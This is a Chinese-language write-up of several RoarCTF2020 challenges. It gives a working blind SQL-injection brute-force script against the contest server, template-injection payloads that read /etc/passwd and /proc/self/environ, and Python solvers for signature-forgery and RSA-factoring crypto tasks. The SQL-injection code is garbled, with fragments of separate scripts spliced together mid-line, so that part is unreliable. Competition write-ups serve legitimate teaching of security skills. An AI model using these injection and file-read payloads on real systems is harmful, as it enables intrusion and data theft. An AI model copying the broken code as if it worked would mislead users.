# RoarCTF2020 部分wp
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## WEB
###  ezsql
实现注入。
    #coding=utf-8
    import requests
    import threading
    import string
    import time
    import sys
    pt = '{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?<>@!#$%^&*~'
    url="http://139.129.98.9:30003/"
    sql="user()"
    def blindequ(start,end):
        ret=""
        for i in range(start,end):
            for ch in pt:
                payload="admn'||(substr({0},{1},1)='{2}')#".format(sql,i,ch)
                data = {
                    "username":payload,
                    "password":'a'
                }
                #print data
                #req=requests.post(url,data=data,allow_redirects=False)
                req=requests.post(url+"/login.php",data=data)
                #print req.text
                #if req.status_code!=200 and req.status_code!=302:
                #    continue 
                if  "password error!" in req.text:
                    ret=ret+ch
                    sys.stdout.write("[-]{0} Result : -> {1} "+ret+"@!#$%^&*~. '
    pt = string.printable+'\xff'
    url = "http://139.129.98.9:30003/"
    # payload_dict = {k: v for k, v in enumerate(pt)}
    sql = "version()"
    def blindequ(start, end):
        ret = ""
        for i in range(start, end):
            # for k, ch in enumerate(pt):
            k = 0
            for k in range(32, 125):
                # payload = "admn'||(substr({0},{1},1)='{2}')#".format(sql, i, ch)
                # payload = "admi'||((0,'%s',2,1,1,1)>(table/**/information_schema.schemata/**/limit/**/2,1))#" % (ret+chr(k))
                payload = "admi'||((0,0,'%s',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)>(table/**/information_schema.tables/**/limit/**/2,1))#" % (ret+chr(k))
                data = {
                    "username": payload,
                    "password": 'a'
                }
                #print data
                # req=requests.post(url,data=data,allow_redirects=False)
                # if random.random()  {1} "+ret+"4:
                result+=chr(j)
                print(result)
                break
###  html编辑器
一个HMTL编辑器，可以写入html再通过?view=XXXXX去访问  
首先写{{1+2}}，结果查询的时候返回了3,可见view去解析的过程中存在模板注入漏洞。  
随便写一点模板注入的代码，确认漏洞存在。
`{% include "/etc/passwd" with raw %}`  
使用include构造任意文件读取
`{% include "/usr/local/app/app.js" with raw %}`  
读源码  
然而读了/etc/profile、/etc/environment、/root/.bash_history等文件都没找到flag  
最后在proc下面找到了  
`{% include "/proc/self/environ" with raw %}`
## Misc
###  签到
file协议导致后面的会url解码一次所以二次编码flag  
直接读到flag
###  Hi_433MHZ
通过加补WAV的头或者直接导入原始数据放大频谱图发现规律
手动转01 后再转字符串即可解得flag
###  FM
通过分析得知是无线电，给了一个调频的范围，考虑是用软件来解调并且直接听无线电即可。  
使用一个脚本来从iq转wav然后以32000MHZ导入进SDR#Sharp
即可听到flag
## Crypto
###  Crypto_System
要求不同的消息有同样的签名，根据s相等，解方程 `x1+b1r1=x2+b2r2`构造r2
    from pwn import *
    from Crypto.Util.number import *
    sh=remote("139.129.98.9","30001")
    from pwnlib.util.iters import mbruteforce
    from hashlib import sha256
    import hashlib
    from math import gcd
    context.log_level = 'debug'
    def proof_of_work(sh):
        sh.recvuntil("XXXX+")
        suffix = sh.recvuntil(')').decode("utf8")[:-1]
        log.success(suffix)
        sh.recvuntil("== ")
        cipher = sh.recvline().strip().decode("utf8")
        proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed')
        sh.sendlineafter("Give me XXXX:", proof)
    proof_of_work(sh)
    sh.interactive()
    # These three are constants
    p = 12039102490128509125925019010000012423515617235219127649182470182570195018265927223
    g = 10729072579307052184848302322451332192456229619044181105063011741516558110216720725
    def int2str(data, mode="big"):
        if mode == "little":
            return sum([ord(data[_]) * 2 ** (8 * _) for _ in range(len(data))])
        elif mode == "big":
            return sum([ord(data[::-1][_]) * 2 ** (8 * _) for _ in range(len(data))])
    def get_parameter(m):
        x = int2str(m, 'little')
        y = pow(g, x, p)
        a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(128, b"\0")).digest())
        b = pow(a, a, p - 1)
        h = pow(g, b, p)
        return y, h, b
    def sign(m):
        y, h, b = get_parameter(m)
        r = getStrongPrime(512)
        s = (y * powmod(h, r, p)) % p 
        return str(r),str(s)
    def verify(m, r, s):
        y, h, b = get_parameter(m)
        if s == ((y * powmod(h, r, p)) % p):
            return True
        else:
            return False
    sh.recvuntil("Here is the frist message(64 bytes):")
    message1 = bytes.fromhex(sh.recvuntil("\n")[:-1].decode()).decode()
    sh.recvuntil("Here is the second message(64 bytes):")
    message2 = sh.recvuntil("\n")[:-1].decode()
    print("message2",message2)
    message2 = bytes.fromhex(message2).decode()
    sh.recvuntil("The frist message's 'r':")
    message1_r = int(sh.recvuntil("\n")[:-1])
    sh.recvuntil("Please choice your options:")
    message1_y, message1_h, message1_b = get_parameter(message1)
    message1_s = (message1_y * pow(message1_h, message1_r, p)) % p
    message2_s = message1_s
    #s == ((y * powmod(h, r, p)) % p)
    message2_y, message2_h, message2_b = get_parameter(message2)
    #target = (message2_s * inverse(message2_y,p))%p
    #print("p=",p)
    #print("target=",target)
    #print("message2_h",message2_h)
    #x1+b1r1=x2+b2r2
    print(message1)
    print(message2)
    x1 = int2str(message1, 'little')
    b1 = message1_b
    r1 = message1_r
    x2 = int2str(message2, 'little')
    b2 = message2_b
    tmp = gcd(b2,p-1)
    print(tmp)
    r2 = (((x1+b1*r1-x2)//tmp)*inverse(b2//tmp,p-1))%(p-1)
    print(r2,message2_s)
    sh.sendline("3")
    sh.recvuntil("Please give me the (r,s) of the second message:")
    print("("+str(r2)+","+str(message2_s)+")")
    sh.sendline("("+str(r2)+","+str(message2_s)+")")
    sh.interactive()
###  EASYRSA
先利用beta求出tip，再用tip求出x+y,x * y，解方程的x和y。
    e = 65537
    #m = bytes_to_long(flag)
    #enc = powmod(m,e,n)
    n=17986052241518124152579698727005505088573670763293762110375836247355612011054569717338676781772224186355540833136105641118789391002684013237464006860953174190278718294774874590936823847040556879723368745745863499521381501281961534965719063185861101706333863256855553691578381034302217163536137697146370869852180388385732050177505306982196493799420954022912860262710497234529008765582379823928557307038782793649826879316617865012433973899266322533955187594070215597700782682186705964842947435512183808651329554499897644733096933800570431036589775974437965028894251544530715336418443795864241340792616415926241778326529055663
    e=65537
    enc=10760807485718247466823893305767047250503197383143218026814141719093776781403513881079114556890534223832352132446445237573389249010880862460738448945011264928270648357652595432015646424427464523486856294998582949173459779764873664665361437483861277508734208729366952221351049574873831620714889674755106545281174797387906705765430764314845841490492038801926675266705606453163826755694482549401843247482172026764635778484644547733877083368527255145572732954216461334217963127783632702980064435718785556011795841651015143521512315148320334442235923393757396733821710592667519724592789856065414299022191871582955584644441117223
    beta=11864389277042761216996641604675717452843530574016671576684180662096506094587545173005905433938758559675517932481818900399893444422743930613073261450555599
    tip = (n-1)//(2*beta)
    for i in range(10000):
        x_add_y = tip % beta + beta*i
        x_mul_y = (tip - x_add_y)//(2*beta)
        try:
            if iroot(x_add_y**2 - 4*x_mul_y,2)[1]:
                print "fxxk"
                y = (x_add_y - iroot(x_add_y**2 - 4*x_mul_y,2)[0] )//2
                x = x_add_y - y
                p = 2*y*beta + 1
                q = 2*x*beta + 1
                assert(is_prime(p) and is_prime(q))
                phi = (p-1)*(q-1)
                d = inverse(e,int(phi))
                print long_to_bytes(pow(enc,d,n))
        except:
            pass
###  Reverse
midnight魔改题，原来是十六进制reverse，这里是二进制reverse，魔改原来的脚本即可  
    from Crypto.Util.number import *
    from gmpy2 import *
    from itertools import product
    n = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889
    ct = 103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745
    max_idx = 1
    pq_list = [(1,1)]
    '''
    for idx in range(1, 512):
        mod = 2 ** (idx + 1)
        new_pq_list = []
        for p, q in pq_list:
            for i, j in product(range(2), repeat=2):
                np = i * 2 ** idx + p
                nq = j * 2 ** idx + q
                if (np * nq) % mod != n % mod:
                    continue
                rp_min = int('{:b}'.format(np)[::-1].ljust(512, '0'), 2)
                rq_min = int('{:b}'.format(nq)[::-1].ljust(512, '0'), 2)
                rp_max = int('{:b}'.format(np)[::-1].ljust(512, '1'), 2)
                rq_max = int('{:b}'.format(nq)[::-1].ljust(512, '1'), 2)
                if n < rp_min * rq_min or rp_max * rq_max < n:
                    continue
                new_pq_list.append((np, nq))
        print(len(new_pq_list))
        pq_list = new_pq_list
    for p,q in pq_list:
        #p=13299413764048930133302138749466137829470129709829516069778014310838093114516400589047888072065037035007023741009041669893387899867083575829855377403280423
        #q=11954360020159164180709939019047385560179850436770100207193049651260543609501871575909448998378290922795824941066935928157032997160163537467165365731882943
        if p.bit_length() == q.bit_length()==512: